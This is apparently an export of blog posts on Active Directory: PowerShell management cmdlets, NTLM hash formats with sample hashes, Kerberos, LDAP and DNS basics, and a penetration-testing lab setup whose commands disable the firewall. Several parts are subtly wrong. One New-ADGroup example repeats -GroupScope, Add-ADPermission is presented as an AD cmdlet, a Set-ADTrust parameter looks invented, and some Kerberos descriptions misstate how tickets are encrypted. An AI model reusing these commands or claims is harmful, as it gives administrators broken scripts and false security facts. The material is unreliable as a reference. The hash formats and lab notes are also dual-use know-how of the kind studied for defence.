PowerShellPowerShell is a command-line shell and scripting language developed by Microsoft, designed for task automation and configuration management. Its extensibility and integration with various Microsoft products make it a go-to tool for administrators managing Active Directory environments.Key Cmdlets for AD ManagementTo harness the power of PowerShell in Active Directory management, it’s essential to familiarize yourself with key cmdlets. These cmdlets serve as building blocks for creating scripts and automating tasks. In the upcoming sections, we’ll delve into the practical usage of these cmdlets, demonstrating how they can simplify user, group, and organizational unit management in Active Directory.User ManagementEfficient user management is a key aspect of Active Directory administration, and PowerShell provides powerful cmdlets to streamline these tasks. In this section, we’ll explore how to perform various user management operations using PowerShell.Creating New User Accountsadd new user :New-ADUser -Name \"emsec.sec\" -GivenName \"emsec\" -Surname \"sec\" -Path \"CN=users,DC=dc,DC=lab,DC=local\" -Enabled $true -AccountPassword (ConvertTo-SecureString \"Password@123!\" -AsPlainText -Force) -ChangePasswordAtLogon $falseModifying User Attributes and PropertiesThe Set-ADUser cmdlet allows you to modify user attributes and properties.Set-ADUser -Identity emsec.sec -Description \"Updated description\" -Title \"Manager\"Disabling and enabling user accounts.To disable or enable user accounts, use the Disable-ADAccount and Enable-ADAccount cmdlets, respectively:# Disable a user accountDisable-ADAccount -Identity emsec.sec# Enable a user accountEnable-ADAccount -Identity emsec.secResetting user passwords with PowerShell.Resetting user passwords is a common task. Use the Set-ADAccountPassword cmdlet to set a new password for a user:# Reset user passwordSet-ADAccountPassword -Identity emsec.sec -Reset -NewPassword (ConvertTo-SecureString -AsPlainText \"New_Password@123!\" -Force)Group Management :Effective group management is essential for organizing and controlling access in Active Directory. PowerShell simplifies these tasks through various cmdlets. Let’s explore how to perform key group management operations.Creating Security Groups and Distribution GroupsUse the New-ADGroup cmdlet to create security groups or distribution groups. Customize the command based on your requirements:# Create a security groupNew-ADGroup -Name \"pentesters\" -GroupScope Security -GroupScope Global# Create a distribution groupNew-ADGroup -Name \"pentesters\" -GroupScope Distribution -GroupScope GlobalAdding and removing users from groups.Manage group memberships with the Add-ADGroupMember and Remove-ADGroupMember cmdlets:# Add a user to a groupAdd-ADGroupMember -Identity pentesters -Members emsec.sec # Remove a user from a groupRemove-ADGroupMember -Identity pentesters -Members emsec.secManaging group memberships.The Get-ADGroupMember cmdlet allows you to retrieve members of a group:# Get members of a groupGet-ADGroupMember -Identity pentestersOrganizational Unit (OU) ManagementOrganizational Units (OUs) provide a way to organize and manage objects within Active Directory. PowerShell offers convenient cmdlets for creating, managing, and moving objects between OUs. Let’s explore how to perform key OU management tasks.Creating and managing Organizational Units with PowerShell.To create and manage OUs, you can use the New-ADOrganizationalUnit and Get-ADOrganizationalUnit cmdlets. Here’s an example of creating a new OU:# Create a new Organizational UnitNew-ADOrganizationalUnit -Name pentesters_ou -Path \"DC=dc,DC=lab,DC=local\"You can retrieve information about existing OUs using:# Get information about OUsGet-ADOrganizationalUnit -Filter *Moving objects between OUs.Moving objects between OUs is a common administrative task. The Move-ADObject cmdlet allows you to accomplish this:# Move a user to a different OUMove-ADObject -Identity \"CN=emsec.sec,OU=users,DC=lab,DC=local\" -TargetPath \"OU=pentesters_ou,DC=lab,DC=local\"This command moves the specified object (in this case, a user) from one OU to another.Note: You can move any object, such as groups or users, as neededAutomation and ScriptingAutomation is a key advantage of PowerShell, allowing administrators to streamline and simplify routine Active Directory management tasks. In this section, we’ll explore the fundamentals of writing scripts, using variables and loops, and implementing error handling in PowerShell.Writing scripts to automate common AD management tasks.Scripts provide a powerful mechanism for automating repetitive tasks. You can use PowerShell scripts to perform various Active Directory operations, such as creating users, modifying attributes, and managing groups. Here’s a simple example script:# Example PowerShell script for user creation$users = @(\"User1\", \"User2\", \"User3\")foreach ($user in $users) { New-ADUser -SamAccountName $user -UserPrincipalName \"$user@domain.com\" -Name $user -Enabled $true -AccountPassword (ConvertTo-SecureString \"Password@123!\" -AsPlainText -Force)}Using variables and loops in PowerShell scripts.Variables and loops are essential components of scripting. Variables store data, and loops allow you to repeat a block of code. Here’s an example demonstrating their usage:# Example PowerShell script with variables and loops$domain = \"domain.com\"$users = @(\"User1\", \"User2\", \"User3\")foreach ($user in $users) { $userPrincipalName = \"$user@$domain\" New-ADUser -SamAccountName $user -UserPrincipalName $userPrincipalName -Name $user -Enabled $true -AccountPassword (ConvertTo-SecureString \"Password@123!\" -AsPlainText -Force)}Error handling in PowerShell scripts.Error handling ensures that scripts respond appropriately to unexpected situations. The try and catch blocks in PowerShell facilitate effective error handling. Consider the following example:# Example PowerShell script with error handlingtry { # Command that might throw an error Get-ADUser -Identity \"NonExistentUser\" -ErrorAction Stop} catch { # Handle the error Write-Host \"User not found. Error details: $_\"}Security Best PracticesMaintaining a secure Active Directory environment is paramount for any organization. PowerShell provides powerful tools to implement security best practices, such as role-based access control (RBAC) and auditing. Let’s delve into these essential aspects.Implementing role-based access control in AD with PowerShell.RBAC allows administrators to assign specific roles and permissions to users or groups, ensuring that they have the necessary access without granting unnecessary privileges. PowerShell facilitates RBAC implementation through the Add-ADPermission and Remove-ADPermission cmdlets. Here’s a simplified example:# Example PowerShell script for RBAC# Granting permissionAdd-ADPermission -Identity \"OU=pentesters_ou,DC=dc,DC=lab,DC=local\" -User \"emsec.sec\" -AccessRights \"ReadProperty\", \"WriteProperty\" -Properties \"Description\"# Revoking permissionRemove-ADPermission -Identity \"OU=pentesters_ou,DC=dc,DC=lab,DC=local\" -User \"emsec.sec\" -AccessRights \"ReadProperty\", \"WriteProperty\" -Properties \"Description\"Auditing and monitoring AD changes using PowerShell.Monitoring changes in Active Directory is critical for security and compliance. PowerShell provides the Get-ADObject cmdlet for querying changes. Here’s an example to retrieve recent changes:# Example PowerShell script for AD auditing# Retrieve recent changes in Active Directory$startDate = (Get-Date).AddDays(-7)Get-ADObject -Filter {WhenChanged -ge $startDate} -Properties * | Format-Table Name, WhenChangedRegularly auditing and monitoring changes help identify and respond to security incidents promptly, enhancing the overall security posture of your Active Directory environment.Advanced TopicsExploring advanced topics in Active Directory enhances your administrative capabilities. PowerShell offers powerful cmdlets to manage trusts, query specific information, and work with fine-grained password policies. Let’s delve into these advanced areas.Managing Active Directory trusts.Active Directory trusts are crucial for establishing secure communication between domains. PowerShell provides the Get-ADTrust and Set-ADTrust cmdlets to manage trusts efficiently:# Example PowerShell script for managing trusts# Get information about trustsGet-ADTrust -Filter *# Modify trust propertiesSet-ADTrust -Identity \"TrustName\" -NewTrustDirection BidirectionalThese cmdlets enable administrators to retrieve information about existing trusts and modify trust properties as needed.Querying AD for specific information.Efficient querying of Active Directory is essential for retrieving specific information. The Get-ADObject cmdlet is versatile for this purpose. Here’s an example to query user information:# Example PowerShell script for querying AD# Get information about usersGet-ADObject -Filter {ObjectClass -eq \"user\"} -Properties Name, SamAccountName, EnabledCustomize the script to query the information you need based on the object class and properties.Working with fine-grained password policies.Fine-grained password policies allow organizations to define password policies for different sets of users. PowerShell facilitates management through the Get-ADFineGrainedPasswordPolicy and Set-ADFineGrainedPasswordPolicy cmdlets:# Example PowerShell for managing fine-grained password policies# Get information about fine-grained password policiesGet-ADFineGrainedPasswordPolicy -Filter *# Modify password policy propertiesSet-ADFineGrainedPasswordPolicy -Identity \"PolicyName\" -MaxPasswordAge \"30.00:00:00\"These cmdlets enable administrators to retrieve information about existing fine-grained password policies and modify policy properties to meet security requirements.Exploring these advanced topics equips administrators with the tools needed to manage complex aspects of Active Directory effectively.ConclusionIn conclusion, mastering Active Directory management with PowerShell opens up a world of efficiency and automation for administrators. Let’s recap the key points covered in this guide: User and Group Management: The guide provided insights into creating and managing user accounts, modifying attributes, and efficiently managing group memberships. Organizational Unit (OU) Management: You learned how to create and manage OUs, as well as move objects between OUs using PowerShell. Automation and Scripting: Understanding the basics of scripting, using variables and loops, and implementing error handling in PowerShell scripts for efficient AD automation. Security Best Practices: We covered implementing role-based access control (RBAC) and auditing AD changes, ensuring a secure Active Directory environment. Advanced Topics: Explored managing AD trusts, querying AD for specific information, and working with fine-grained password policies. Encouragement to ExploreAs you continue your journey in Active Directory management, we encourage you to explore additional PowerShell cmdlets and functionalities. The PowerShell ecosystem is vast, and continual exploration will deepen your expertise and make your administrative tasks even more efficient.Whether you’re a seasoned administrator or just starting, the combination of PowerShell and Active Directory offers endless possibilities for automation and optimization. Happy scripting!" }, { "title": "NTLM Authentication in Active Directory", "url": "/posts/NTLM/", "categories": "notes", "tags": "Active Directory, NTLM", "date": "2022-11-23 09:00:00 +0100", "snippet": "NTLM Authentication in Active DirectoryIntroduction:In Active Directory (AD), apart from Kerberos and LDAP, various other authentication methods are used by applications and services. These include...", "content": "NTLM Authentication in Active DirectoryIntroduction:In Active Directory (AD), apart from Kerberos and LDAP, various other authentication methods are used by applications and services. These include LM, NTLM, NTLMv1, and NTLMv2. Understanding the differences between these hashes and protocols is crucial for securing AD environments.Hash Protocol Comparison: Hash/Protocol Cryptographic technique Mutual Authentication Message Type Trusted Third Party NTLM Symmetric key cryptography No Random number Domain Controller NTLMv1 Symmetric key cryptography No MD4 hash, random number Domain Controller NTLMv2 Symmetric key cryptography No MD4 hash, random number Domain Controller Kerberos Symmetric key cryptography &amp; asymmetric cryptography Yes Encrypted ticket using DES, MD5 Domain Controller/Key Distribution Center (KDC) Hash Type Example LM Hash 299bd128c1101fd6 NTLM Hash Rachel:500:aad3c435b514a4eeaad3b935b51304fe:e46b9e548fa0d122de7f59fb6d48eaa2::: NTLMv1 Hash u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c NTLMv2 Hash admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030 Domain Cached Credentials (MSCache2) Hash $DCC2$10240#bjones#e4e938d12fe5974dc42a90120bd9… Note: Neither LANMAN nor NTLM uses a salt.NTLM Authentication Request:LM Hash : LM hashes are the oldest password storage mechanism in Windows, used until Windows Vista/Server 2008. Limited to 14 characters, case-insensitive, and vulnerable due to the hashing algorithm weaknesses. Encrypted using DES keys created from 7-character chunks and concatenated to form the LM hash. Disallowing LM hashes using Group Policy is recommended.NTHash (NTLM): NTLM hashes are used on modern Windows systems and are an improvement over LM hashes. Derived from the MD4 hash of the little-endian UTF-16 value of the password. Vulnerable to offline brute-force attacks but more secure than LM hashes. Used in a challenge-response authentication protocol for network authentication.NTLMv1 (Net-NTLMv1): An improvement over NTLM, but still uses the NT hash along with the LM hash. Vulnerable to certain attacks and can be cracked offline if captured. Used in challenge-response authentication with a 24-byte response to an 8-byte challenge.NTLMv2 (Net-NTLMv2): Introduced in Windows NT 4.0 SP4 and became the default since Server 2000. More secure than NTLMv1, doesn’t use the LM hash, and uses HMAC-MD5 for challenge-response. Sends two responses to an 8-byte challenge, including HMAC-MD5 hash of the user’s credentials.Domain Cached Credentials (MSCache2): MSCache2 is used when a domain-joined host can’t communicate with a domain controller. Hosts save the last ten hashes of domain users in the registry HKEY_LOCAL_MACHINE\\SECURITY\\Cache. Hashes cannot be used in pass-the-hash attacks and are slow to crack.ConclusionUnderstanding the various hash types and authentication protocols in Active Directory is essential for maintaining a secure environment. While Kerberos is preferred, it’s crucial to implement proper security measures for LM and NTLM to prevent potential attacks. Being aware of the strengths and weaknesses of each hash type helps in designing effective defense strategies for AD environments." }, { "title": "Kerberos Active DIrectory", "url": "/posts/KERBEROS/", "categories": "notes", "tags": "Active Directory, Kerberos", "date": "2022-11-23 08:00:00 +0100", "snippet": "KerberosIntroduction:What is Kerberos protocol :Kerberos is a network authentication protocol designed to provide secure authentication for users and services in a distributed computing environment...", "content": "KerberosIntroduction:What is Kerberos protocol :Kerberos is a network authentication protocol designed to provide secure authentication for users and services in a distributed computing environment. It is primarily used to ensure that only trusted entities can access network resources and services. Kerberos uses tickets to authenticate users without transmitting their passwords over the network, making it a more secure authentication mechanism.Kerberos and active directory :Kerberos and Active Directory (AD) are integral components of modern network authentication and security. Kerberos is a network authentication protocol, while Active Directory is a directory service developed by Microsoft. Together, they provide a robust and secure authentication and authorization framework for users and resources in a Windows domain-based network environment. In this note, we will explore the key features of Kerberos and its integration with Active Directory.The Kerberos protocol uses port 88 (both TCP and UDP). When enumerating an Active Directory environment, we can often locate Domain Controllers by performing port scans looking for open port 88 using a tool such as Nmap.Components of Kerberos: Principal : In Kerberos, users, services, and servers are represented as principals. A principal is a unique identifier associated with a user or service. Authentication Server (AS) : The AS is responsible for initial authentication. When a user wants to access a service, they request a Ticket Granting Ticket (TGT) from the AS by providing their credentials (username and password). Ticket Granting Ticket (TGT) : The TGT is a time-limited ticket issued by the AS to the client after successful authentication. It allows the client to request service tickets without re-authenticating repeatedly. Ticket Granting Service (TGS) : The TGS is responsible for issuing service tickets to the client. To obtain a service ticket, the client presents the TGT to the TGS. • Service Ticket : The service ticket is issued by the TGS to the client, granting access to a specific service.Active Directory (AD):AD is Microsoft’s implementation of a directory service that centralizes and manages network resources such as user accounts, computers, printers, and other network devices. It provides a hierarchical database that stores information about the network objects.)Integration of Kerberos with Active Directory:Active Directory uses Kerberos as its default authentication protocol. When a Windows client joins an AD domain, it automatically becomes a part of the Kerberos realm. The AD domain controllers act as the Authentication Servers (AS) in the Kerberos infrastructure.Kerberos Authentication Process in Active Directory: The user logs on, and their password is converted to an NTLM hash, which is used to encrypt the TGT ticket. This decouples the user’s credentials from requests to resources. The KDC service on the DC checks the authentication service request (AS-REQ), verifies the user information, and creates a Ticket Granting Ticket (TGT), which is delivered to the user. The user presents the TGT to the DC, requesting a Ticket Granting Service (TGS) ticket for a specific service. This is the TGS-REQ. If the TGT is successfully validated, its data is copied to create a TGS ticket. The TGS is encrypted with the NTLM password hash of the service or computer account in whose context the service instance is running and is delivered to the user in the TGS_REP. The user presents the TGS to the service, and if it is valid, the user is permitted to connect to the resource (AP_REQ). Authentication Service Request : An AS-REQ is a message sent to the authentication service (AS). All the AS does is exchange credentials for tickets. These credentials can be anything, but are often passwords.Benefits of Kerberos with Active Directory: Single Sign-On (SSO) : Kerberos enables SSO, allowing users to access multiple services with a single authentication, enhancing user experience and reducing the need to remember multiple passwords. Mutual Authentication : Both the client and the server mutually authenticate each other through cryptographic mechanisms, ensuring the authenticity of the communication. No Password Transmission : Kerberos avoids transmitting user passwords over the network, significantly reducing the risk of password interception. Ticket Expiration: Tickets have a limited validity period, minimizing the impact of compromised tickets. Conclusion:Kerberos and Active Directory play crucial roles in securing authentication within Windows-based network environments. By using the robust and proven Kerberos protocol, Active Directory provides a strong foundation for ensuring secure access to network resources, protecting sensitive data, and enhancing overall network security. Understanding the principles of Kerberos and its integration with Active Directory is essential for network administrators and IT professionals tasked with maintaining a secure and efficient network infrastructure." }, { "title": "LDAP Lightweight Directory Access Protocol", "url": "/posts/LDAP/", "categories": "notes", "tags": "Active Directory, ldap", "date": "2022-11-23 07:00:00 +0100", "snippet": "LDAPIntroduction to LDAP :LDAP Lightweight Directory Access Protocol is a widely used protocol for accessing and managing directory information. When integrated with Active Directory (AD), LDAP ser...", "content": "LDAPIntroduction to LDAP :LDAP Lightweight Directory Access Protocol is a widely used protocol for accessing and managing directory information. When integrated with Active Directory (AD), LDAP serves as the primary means of querying and modifying objects within AD. In this note, we will explore how LDAP works with Active Directory.LDAP uses port 389, and LDAP over SSL (LDAPS) communicates over port 636.LDAP Overview: LDAP is a protocol used to access and interact with directory services, which store and organize information in a hierarchical structure. It operates over TCP/IP and uses a client-server model, where the client sends requests, and the server responds with the requested data.What LDAP is not :I’d rather want to be sure that you are aware of what LDAP is not: LDAP is not a server LDAP is not a database LDAP is not a network service LDAP is not a network device LDAP is not an authentication procedure LDAP is not a user/password repository LDAP is not a specific open or closed source productLDAP (Lightweight Directory Access Protocol) is a protocol used for accessing and maintaining distributed directory information services, but it is not a server, database, network service, network device, authentication procedure, user/password repository, or a specific open or closed-source product. LDAP is a protocol that facilitates communication between clients and directory servers for directory-related operations.LDAP and Active Directory Integration :Active Directory is LDAP-compliant, allowing clients to communicate with it using LDAP queries to retrieve, add, modify, or delete information about directory objects.What is LDAP Authentication For Active Directory :LDAP authentication for Active Directory is a process that verifies user identities by checking their credentials against a directory service, like Microsoft’s Active Directory, using the Lightweight Directory Access Protocol (LDAP). It’s a common method for securing access to network resources in enterprise environments.LDAP Distinguished Names (DNs) in AD:In Active Directory, LDAP Distinguished Names (DNs) uniquely identify and locate entries within the directory tree. DNs are structured hierarchically and typically include components such as the Common Name (CN), Organizational Unit (OU), Domain Component (DC), and more. For example:CN=user,CN=Users,DC=example,DC=comHere, user is the Common Name within the Users container of the example.com domain. DNs play a crucial role in LDAP queries and operations, helping specify the exact location of directory entries.The DN includes the object’s ` Relative Distinguished Name (RDN)` and the path from the root of the directory to the object.LDAP Queries in AD:LDAP queries are used to search for specific information within Active Directory.a simple example of an LDAP query:(&amp;(objectClass=user)(sAMAccountName=username))This query searches for a user object with a specific SAM Account Name (username).Let’s break it down:&amp;: Logical AND operator.(objectClass=user): Specifies that the entry must be a user object.(sAMAccountName=username): Specifies the SAM Account Name of the user.You can customize LDAP queries based on your specific search criteria, allowing you to retrieve information about users, groups, or other objects in the Active Directory. The structure and syntax of LDAP queries may vary depending on the requirements of your search.AD LDAP Authentication: LDAP BIND TYPES : in the LDAP protocol the authentication operation is called Bind. A bind can be performed in 3 different ways: Bind Types Credit Requirement Anonymous Bind No Simple Password Bind Yes SASL (Simple Authentication and Security Layer, allowing a larger set of authentication mechanisms) Bind Yes Note : The LDAP standard is defined in a series of documents known as Request for Comments (RFCs), primarily RFC 4510 and its related RFCs.Simple Authentication : Includes anonymous, unauthenticated, and username/password authentication. Users provide a username and password in a BIND request to authenticate with the LDAP server. This method is straightforward but may transmit passwords in cleartext, posing a security risk.SASL Authentication: SASL (Simple Authentication and Security Layer) utilizes other authentication services like Kerberos for binding to the LDAP server. Instead of transmitting credentials directly, SASL sends authentication requests to the authorization service (e.g., Kerberos) using the LDAP protocol. The authorization service responds with challenge/response messages, determining successful or unsuccessful authentication. SASL enhances security by separating authentication methods from application protocols.Note : LDAP authentication messages are transmitted in cleartext by default, making them susceptible to interception on the internal network. To enhance security, it is recommended to use TLS encryption or similar methods to protect this information during transit.LDAP Filter Syntax: The LDAP filter defines the conditions that must be fulfilled in order for the Search to match a given entry and must follow the syntax defined in RFC 4515. The filter is composed of assertions that can be joined with AND (&amp;) or OR ( ) operators, or negated with the NOT (!) operator. The AND, OR, and NOT choices can be used to form combinations of assertions in a complex filter. At least one filter element must be present in an AND or in a OR. example : NOT, AND and ORmix the NOT, AND and OR to form a more complex filter as in:(|(&amp;(objectClass=inetOrgPerson)(!(cn=Smith))(cn=admin*))This filter example retrieves all entries whose cn starts with admin and all entries of class inetOrgPerson with a surname different from Smith.Read More HereLDIF (LDAP Data Interchange Format) :LDIF, or LDAP Data Interchange Format, is a standard plain-text format for representing LDAP directory entries and updates. It provides a way to import and export directory entries, making it a common format for exchanging data between LDAP-compliant directory servers and applications.In LDIF, each entry or update is represented in a structured and readable manner. Here’s a basic example of an LDIF entry:dn: cn=John Doe,ou=Users,dc=example,dc=comchangetype: addobjectClass: personobjectClass: organizationalPersonobjectClass: inetOrgPersoncn: John Doesn: DoegivenName: Johnmail: john.doe@example.comLDIF is defined in RFC2849 in two different flavours: LDIF-CONTENT and LDIF-CHANGE LDIF-CONTENT is used to describe LDAP entries in an ASCII stream (i.e. a file) LDIF-CHANGE is used to describe Add, Delete, Modify and ModifyDn operations. Common LDAP Operations in Active Directory : Bind : The process of authenticating the client to the LDAP server. Search : The process of querying AD for specific information using LDAP filters. Add : The process of creating new objects in the AD directory. Modify : The process of updating existing attributes of objects in the directory. Delete : The process of removing objects from the directory.LDAPS and LDAP over TLS :LDAPS, the secure variant of LDAP, employs SSL/TLS encryption to safeguard data during transmission. Within Active Directory, LDAPS is fully supported, providing a secure channel for the exchange of sensitive information, reinforcing the confidentiality and integrity of your data.LDAP over SSL (LDAPS) :Protocol: LDAPS secures LDAP communication using the Secure Sockets Layer (SSL) or its successor, Transport Layer Security (TLS).Port: LDAPS typically operates on port 636, ensuring encrypted communication.Encryption: Data exchanged between the LDAP client and server is encrypted, guaranteeing both confidentiality and integrity.Usage: LDAPS is the go-to choice when a secure and encrypted connection is required right from the beginning of the LDAP session.Example LDAPS URL:ldaps://ldap.example.com:636LDAP over TLS (STARTTLS):Protocol: LDAP over TLS introduces security through the STARTTLS operation, allowing the establishment of a secure connection within a plain LDAP session.Port: Initially, the standard LDAP port (usually 389) is used, with encryption negotiated using STARTTLS.Encryption: The connection begins in an unencrypted state but transitions to a secure, encrypted one after the STARTTLS operation.Usage: STARTTLS is particularly useful when there’s a need to upgrade a plain LDAP connection to a secure one during the session.Example LDAP over TLS URL:ldap://ldap.example.com:389Both LDAPS and LDAP over TLS play crucial roles in fortifying LDAP communication security, preventing unauthorized access to sensitive directory information.Conclusion:LDAP is a powerful protocol that allows clients to interact with directory services like Active Directory efficiently. By understanding LDAP’s basic principles and its integration with Active Directory, administrators and developers can effectively manage and query directory information, providing a robust and secure directory service for Windows-based networks." }, { "title": "DNS Domain Name System", "url": "/posts/DNS/", "categories": "notes", "tags": "Active Directory, DNS", "date": "2022-11-23 07:00:00 +0100", "snippet": "DNS :Introduction:DNS (Domain Name System) is a fundamental protocol used on the internet and local networks to translate human-readable domain names into numerical IP addresses. It plays a crucial...", "content": "DNS :Introduction:DNS (Domain Name System) is a fundamental protocol used on the internet and local networks to translate human-readable domain names into numerical IP addresses. It plays a crucial role in enabling users to access websites and services by typing user-friendly domain names rather than remembering complex IP addresses.Purpose of DNS:DNS serves as a phone book for the internet, converting domain names (e.g., www.example.com) into their corresponding IP addresses (e.g., 192.0.2.1).It simplifies the process of accessing websites, services, and resources, making the internet more user-friendly.Domain Name Structure:A domain name is organized hierarchically from right to left, with the top-level domain (TLD) at the rightmost part (e.g., .com, .org).Subdomains are located to the left of the TLD (e.g., subdomain.example.com).DNS Resolution Process:When a user enters a domain name in a web browser, the device queries a DNS server to obtain the corresponding IP address.The DNS resolution process involves multiple steps, starting from the local DNS resolver and proceeding through authoritative DNS servers until the IP address is obtained.DNS Records:DNS servers store various types of records that hold specific information about a domain.Common DNS record types include:► A (Address) record: Maps a domain to an IPv4 address.► AAAA (IPv6 Address) record: Maps a domain to an IPv6 address.► CNAME (Canonical Name) record: Creates an alias for another domain name.► MX (Mail Exchange) record: Specifies the mail server responsible for handling emails for a domain.► NS (Name Server) record: Indicates the authoritative name servers for a domain.► TXT (Text) record: Stores descriptive text associated with a domain.DNS Caching: To improve DNS resolution speed and reduce the load on authoritative DNS servers, DNS resolvers often cache DNS records locally. Cached records have a time-to-live (TTL) value, which determines how long the record remains valid before it needs to be refreshed from authoritative servers.DNS Propagation: When changes are made to DNS records, it takes some time for these changes to propagate throughout the internet. The time it takes for DNS changes to be visible globally varies and depends on the TTL of the affected DNS records.Conclusion:DNS is a critical component of the internet infrastructure, enabling users to access websites and services using user-friendly domain names. By translating domain names into IP addresses, DNS simplifies the process of navigating the internet and plays a vital role in making online interactions seamless and efficient. Understanding the basics of DNS is essential for anyone working with networks, web hosting, or managing domain names." }, { "title": "Active Directory Mastery - A Guide to Windows Server Setup for Penetration Testing", "url": "/posts/ADDC-LAB-PART_01/", "categories": "Ethical Hacking, AD DC", "tags": "Active Directory", "date": "2022-11-20 13:00:00 +0100", "snippet": "Setting Up a Windows Server for Penetration Testing with Active Directory1. Introduction Overview of the blog's purpose :Welcome to the Active Directory Pentesting Blog, your ultimate guide for con...", "content": "Setting Up a Windows Server for Penetration Testing with Active Directory1. Introduction Overview of the blog's purpose :Welcome to the Active Directory Pentesting Blog, your ultimate guide for constructing a robust and secure Windows Server environment crafted specifically for penetration testing. Whether you’re a beginner or an experienced professional, this blog aims to offer a comprehensive guide to help you build your own penetration testing labImportance of a controlled environment for penetration testing :In the realm of cybersecurity, the significance of a controlled environment for penetration testing cannot be overstated. A controlled environment provides a safe and isolated space where ethical hackers, security professionals, and enthusiasts can simulate real-world cyber threats without compromising the integrity of live systems. Here’s why it matters: Risk Mitigation :Enables safe exploration without the risk of damaging live systems. Realistic Scenarios:Mimics real-world conditions, providing a close-to-reality testing environment. Skill Development :Offers a hands-on learning ground for system administration, network security, and ethical hacking. Confidentiality and Compliance :Protects sensitive data, ensuring compliance with regulatory requirements. Iterative Testing :Facilitates continuous improvement by refining strategies based on test outcomes. Ethical Practices :Promotes ethical and responsible hacking, emphasizing constructive use of hacking skills.2. Lab SetupHardware and software requirements :To establish a robust penetration testing lab with Windows Server 2012 as the Active Directory Domain Controller (AD DC) server, Windows 10 as the client machine, and Kali Linux for attacking, ensure your hardware and software meet the following requirements:Hardware Requirements: Server Machine (Windows Server 2012 r2): Component Specification Processor Dual-core processor or higher. RAM 2 GB or more. Storage 50 GB or more for the operating system and additional space for virtual machines. Client Machine (Windows 10): Component Specification Processor Dual-core processor or higher. RAM 2 GB or more. Storage 30 GB or more for the operating system and applications. Attacking Machine (Kali Linux): Component Specification Processor Dual-core processor or higher. RAM 2 GB or more. Storage 30 GB or more for the operating system and tools. Software Requirements : Windows Server 2012 R2 :You can Download ISO of Windows SERVER 2012 r1 from here Windows 10 :You can Download Windows 10 from here Kali Linux :Choose any OS for penetration testing; I recommend using Kali linux for optimal results.Virtualization Platform :Choose a virtualization platform like VMware Workstation Pro or VirtualBox for creating and managing virtual machines.3. Basic Configuration Configuration script :Windows Server 2012 r2 : Component Specification MACHINE NAME SRV-1 IPv4 Address 10.10.10.10/8 Mask 255.0.0.0 DNS 127.0.0.1 (We will make changes to this in part 2 as we need to create a DNS server) ANTIVIRUS ENABLE FIREWALL DISABLE Why disable the firewall? Because the firewall might block ICMP connections between the host server and the client, as well as the client to the server. Alternatively, you would have to allow these ports through the firewall settingsWindows 10 (clients) and kali linux :For simplicity, we will assign the following IP addresses: Client 1 - 10.10.10.20, Client 2 - 10.10.10.30, and Kali Linux - 10.10.10.40 Note : The DNS and default gateway will be set to the server’s address, which is 10.10.10.10.I think that is clear. Now, let’s configure this setupAdding Second Interface in VMware :After installing Windows Server 2012, Windows 10, and Kali Linux, the next step is to configure the network. Create a second bridged virtual network adapter directed to the second card and add it to the Virtual Machine. Why? This is done to isolate this LAN segment, enabling seamless communication among these machines. The first interface ensures internet connectivity for downloading or upgrading system components.To add a new network adapter, navigate to Settings of SRV Machine &gt; click add (make sure the first interface is NAT for Internet connection)Select Network Adapter and click FinishCreate a LAN Segment called ‘LAB.LOCAL’Link This LAN segment with the second interface Note : You can follow the same previous steps for all machines.Configuring networking (static IP, DNS settings).Windows Server 2012 r2 :By default Ethenet0 is the first interface and the second interface that we added is Ethernet1 . To set a static IP for Ethernet1 in Windows using CMD, you can use the following commands (win + R &amp; cmd ):#IP Addressnetsh interface ipv4 set address name=\"Ethernet1\" static 10.10.10.10 255.0.0.0 10.10.10.1#DNSnetsh interface ipv4 set dns name=\"Ethernet1\" static 127.0.0.1#Changeing Name of Machinenetdom renamecomputer %COMPUTERNAME% /newname:SRV-1 /reboot:0#To disable Firewallnetsh advfirewall set allprofiles state off#If you want to enable it laternetsh advfirewall set allprofiles state onWindows 10 (Clinet-1 &amp; Clinet-2): Client-1 :#IP Addressnetsh interface ipv4 set address name=\"Ethernet1\" static 10.10.10.20 255.0.0.0 10.10.10.10#DNS (address of AD server)netsh interface ipv4 set dns name=\"Ethernet1\" static 10.10.10.10# Changing Name of Machinenetdom renamecomputer %COMPUTERNAME% /newname:user-1 /reboot:0#To disable Firewallnetsh advfirewall set allprofiles state off#If you want to enable it laternetsh advfirewall set allprofiles state on Client-2 :#IP Addressnetsh interface ipv4 set address name=\"Ethernet1\" static 10.10.10.30 255.0.0.0 10.10.10.10#DNS (address of AD server)netsh interface ipv4 set dns name=\"Ethernet1\" static 10.10.10.10# Changing Name of Machinenetdom renamecomputer %COMPUTERNAME% /newname:user-2 /reboot:0#To disable Firewallnetsh advfirewall set allprofiles state off#If you want to enable it laternetsh advfirewall set allprofiles state on Kali Linux :# IP Addresssudo ifconfig eth1 10.10.10.40 netmask 255.0.0.0# DNSsudo ip route add default via 10.10.10.10 dev eth1# Activate The Interface sudo ip link set eth1 upTesting The connectivity :We have completed the basic configuration of the machines and the necessary settings. Now, it’s time to test the connectivity, ensuring it works both from the server to the client and from the client to the server. From Kali linux to SRV1 :The connection is successful between Kali Linux (attacker) and SRVE-1 (Windows Server 2012) From SRV1 To Kali:It’s fine too Note : If the connectivity fails, check the firewall settings as mentioned earlier.You can follow the same steps to check the connectivity between the clients and SRVE-1, as well as with Kali Linux.Diagram :4. Active Directory Domain Controller SetupInstalling the Active Directory Domain Services role :While Windows Server 2012 provides a graphical user interface (GUI) method for adding features such as the Active Directory module, we’ll take a detour and explore the command-line prowess of PowerShell. Why? Because embracing PowerShell not only enhances your scripting skills but also offers a more efficient and scalable way to manage and automate tasks. So, let’s skip the GUI this time and dive into the powerful world of PowerShell for our Active Directory module installation. Component Specification Domain Name DC.LAB.LOCAL Password Pen_lab@2023! Open PowerShell as AdministratorRight-click on the PowerShell icon and choose Run as Administrator to ensure elevated privileges. Install the Active Directory ModuleInstall-WindowsFeature AD-Domain-Services -IncludeManagementTools Creating the domain and forest.So, the domain name will be dc.lab.local, and the password is Pen_lab@2023!. The domain installation process may take from 2 to 5 minutes. During the installation, PowerShell will prompt you to restart the machine. Choose Y or Yes and wait until the installation completes and the machine rebootsInstall-ADDSForest -DomainName dc.lab.local -InstallDNSAfter the machine reboots, the name of our domain will appear in Server Manager under Local Server :checking by Get-ADdoamin command, This will show you information about your new Domain :Now, everything looks great. We have successfully created our domain dc.lab.local. Let’s move on to the user and group management section.5. User and Group ManagementAdding users and groups to the domain :Now that our Active Directory is up and running, 